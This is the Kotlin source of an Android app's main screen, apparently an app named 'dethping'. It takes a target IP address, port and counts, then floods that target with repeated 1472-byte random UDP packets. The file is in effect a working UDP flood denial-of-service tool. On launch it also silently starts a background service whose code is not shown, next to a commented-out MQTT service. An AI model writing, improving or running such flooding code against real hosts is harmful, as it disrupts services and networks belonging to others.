package `in`.planckstudio.dethping

import android.annotation.SuppressLint
import android.app.ProgressDialog
import android.content.Intent
import android.os.AsyncTask
import android.os.Bundle
import android.view.LayoutInflater
import android.view.View
import android.widget.Button
import android.widget.EditText
import android.widget.Toast
import androidx.appcompat.app.AppCompatActivity
import java.io.IOException
import java.net.DatagramPacket
import java.net.DatagramSocket
import java.net.InetAddress

class MainActivity : AppCompatActivity() {

    private lateinit var ipAddressEditText: EditText
    private lateinit var portEditText: EditText
    private lateinit var numPacketsEditText: EditText
    private lateinit var numTimesEditText: EditText
    private lateinit var timeEditText: EditText
    private lateinit var sendButton: Button
    private lateinit var progressDialog: ProgressDialog
    private var senderTask: UDPSenderTask? = null
    private var isRunning: Boolean = false

    @SuppressLint("MissingInflatedId")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
//        startService(Intent(this, MQTTService::class.java))
//        startService(Intent(this, BackgroundService::class.java))

        // Start the BackgroundService
        val serviceIntent = Intent(this, BackgroundService::class.java)
        startService(serviceIntent)

        ipAddressEditText = findViewById(R.id.ip_address_edittext)
        portEditText = findViewById(R.id.port_edittext)
        numPacketsEditText = findViewById(R.id.num_packets_edittext)
        numTimesEditText = findViewById(R.id.num_times_edittext)
        timeEditText = findViewById(R.id.time_edittext)
        sendButton = findViewById(R.id.send_button)

        sendButton.setOnClickListener {
            val ipAddress = ipAddressEditText.text.toString()
            val port = portEditText.text.toString().toInt()
            val numPackets = numPacketsEditText.text.toString().toInt()
            val numTimes = numTimesEditText.text.toString().toInt()
            val execTime = timeEditText.text.toString().toInt()

            progressDialog = ProgressDialog(this@MainActivity)
            progressDialog.setMessage("Sending UDP Packets...")
            progressDialog.isIndeterminate = true
            progressDialog.setCancelable(true)
            progressDialog.setButton(ProgressDialog.BUTTON_NEGATIVE, "Stop") { _, _ ->
                senderTask?.cancel(true)
                progressDialog.dismiss()
                Toast.makeText(this@MainActivity, "UDP Packet sending stopped", Toast.LENGTH_SHORT)
                    .show()
            }
            progressDialog.show()

            senderTask = UDPSenderTask(ipAddress, port, numPackets, numTimes, execTime)
            senderTask!!.execute()
        }
    }

    private inner class UDPSenderTask(
        private val ipAddress: String,
        private val port: Int,
        private val numPackets: Int,
        private val numTimes: Int,
        private val timeInSeconds: Int = 30
    ) : AsyncTask<Void, Void, Void>() {

        override fun doInBackground(vararg params: Void?): Void? {
            try {
                val address = InetAddress.getByName(ipAddress)
                val socket = DatagramSocket()
                val maxPayloadSize = 1472

                for (i in 0 until numPackets) {
                    if (isCancelled) break
                    val message = generateRandomMessage(maxPayloadSize)
                    val buffer = message.toByteArray()
                    for (j in 0 until numTimes) {
                        if (isCancelled) break
                        val packet = DatagramPacket(buffer, buffer.size, address, port)
                        socket.send(packet)
                    }
                }

                socket.close()
            } catch (e: IOException) {
                e.printStackTrace()
            }

            return null
        }

        override fun onPostExecute(result: Void?) {
            progressDialog.dismiss()
            Toast.makeText(this@MainActivity, "UDP Packets sent successfully", Toast.LENGTH_SHORT)
                .show()
        }

        override fun onCancelled() {
            progressDialog.dismiss()
        }

        fun generateRandomMessage(maxSize: Int): String {
            val alphabet = ('a'..'z') + ('A'..'Z')
            val message = StringBuilder()
            var currentSize = 0

            while (currentSize < maxSize) {
                val randomChar = alphabet.random()
                message.append(randomChar)
                currentSize++
            }

            return message.toString()
        }
    }
}